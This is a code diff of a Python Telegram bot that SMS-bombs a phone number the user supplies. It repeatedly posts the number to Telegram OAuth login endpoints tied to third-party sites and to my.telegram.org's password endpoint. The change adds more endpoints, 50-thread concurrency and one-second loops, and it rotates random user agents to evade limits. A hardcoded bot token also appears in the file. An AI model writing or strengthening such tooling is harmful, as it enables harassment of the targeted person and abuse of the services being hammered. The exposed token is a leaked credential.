@@ -3,6 +3,7 @@ import requests
 from fake_useragent import UserAgent
 import time
 import threading
+import concurrent.futures
 
 bot = telebot.TeleBot("8676884588:AAFy8GLWAfTExVAqHLbbf_qIOPPxgNkQOfE")
 
@@ -18,59 +19,63 @@ endpoints = [
     'https://oauth.telegram.org/auth/request?bot_id=319709511&origin=https%3A%2F%2Ftelegrambot.biz&embed=1&return_to=https%3A%2F%2Ftelegrambot.biz%2F',
     'https://oauth.telegram.org/auth/request?bot_id=1803424014&origin=https%3A%2F%2Fru.telegram-store.com&embed=1&request_access=write&return_to=https%3A%2F%2Fru.telegram-store.com%2Fcatalog%2Fsearch',
     'https://oauth.telegram.org/auth/request?bot_id=210944655&origin=https%3A%2F%2Fcombot.org&embed=1&request_access=write&return_to=https%3A%2F%2Fcombot.org%2Flogin',
-    'https://my.telegram.org/auth/send_password'
+    'https://my.telegram.org/auth/send_password',
+    'https://oauth.telegram.org/auth/request?bot_id=1878948291&origin=https%3A%2F%2Fwww.cryptobot.com&embed=1&return_to=https%3A%2F%2Fwww.cryptobot.com%2Flogin',
+    'https://oauth.telegram.org/auth/request?bot_id=1573573111&origin=https%3A%2F%2Fcoinmarketcap.com&embed=1&return_to=https%3A%2F%2Fcoinmarketcap.com%2F',
 ]
 
 active = {}
 
 @bot.message_handler(commands=['start'])
-def start(message):
-    bot.reply_to(message, "кидай номер")
+def start(msg):
+    bot.reply_to(msg, "кидай номер")
 
 @bot.message_handler(commands=['stop'])
-def stop(message):
-    if message.chat.id in active:
-        active[message.chat.id]['stop'] = True
-        bot.reply_to(message, "остановил")
+def stop(msg):
+    if msg.chat.id in active:
+        active[msg.chat.id]['stop'] = True
+        bot.reply_to(msg, "остановил")
     else:
-        bot.reply_to(message, "нет активного")
+        bot.reply_to(msg, "нет активного")
 
 @bot.message_handler(func=lambda m: True)
-def spam(message):
-    txt = message.text.strip()
-    phone = ''.join(filter(str.isdigit, txt))
-    if len(phone) < 10:
-        bot.reply_to(message, "это не номер бля")
+def handle(msg):
+    num = ''.join(filter(str.isdigit, msg.text.strip()))
+    if len(num) < 10:
+        bot.reply_to(msg, "не номер")
         return
-    if message.chat.id in active:
-        bot.reply_to(message, "уже хуярит")
+    if msg.chat.id in active:
+        bot.reply_to(msg, "уже хуярит")
         return
-    bot.reply_to(message, f"спамлю на {phone}")
-    def worker():
+    sent = bot.reply_to(msg, f"спамлю {num}")
+    active[msg.chat.id] = {'stop': False}
+    def worker(chat_id, phone, msg_id):
         ua = UserAgent()
+        session = requests.Session()
         total = 0
-        active[message.chat.id] = {'stop': False}
         try:
-            while True:
-                if active[message.chat.id]['stop']:
-                    break
-                headers = {'user-agent': ua.random}
-                data = {'phone': phone}
-                for endpoint in endpoints:
-                    if active[message.chat.id]['stop']:
-                        break
-                    try:
-                        r = requests.post(endpoint, headers=headers, data=data, timeout=10)
-                        if r.status_code == 200:
-                            total += 1
-                    except:
-                        pass
-                time.sleep(5)
+            while not active[chat_id]['stop']:
+                with concurrent.futures.ThreadPoolExecutor(max_workers=50) as ex:
+                    futures = []
+                    for ep in endpoints:
+                        headers = {'user-agent': ua.random}
+                        data = {'phone': phone}
+                        futures.append(ex.submit(session.post, ep, headers=headers, data=data, timeout=5))
+                    for f in concurrent.futures.as_completed(futures):
+                        if active[chat_id]['stop']:
+                            break
+                        try:
+                            r = f.result()
+                            if r.status_code in (200, 302, 400):
+                                total += 1
+                        except:
+                            pass
+                time.sleep(1)
         finally:
-            if message.chat.id in active:
-                del active[message.chat.id]
-        bot.send_message(message.chat.id, f"готово всего запросов {total}")
-    threading.Thread(target=worker, daemon=True).start()
+            if chat_id in active:
+                del active[chat_id]
+        bot.edit_message_text(f"остановлен всего успешных {total}", chat_id, msg_id)
+    threading.Thread(target=worker, args=(msg.chat.id, num, sent.message_id), daemon=True).start()
 
 if __name__ == '__main__':
     bot.infinity_polling()
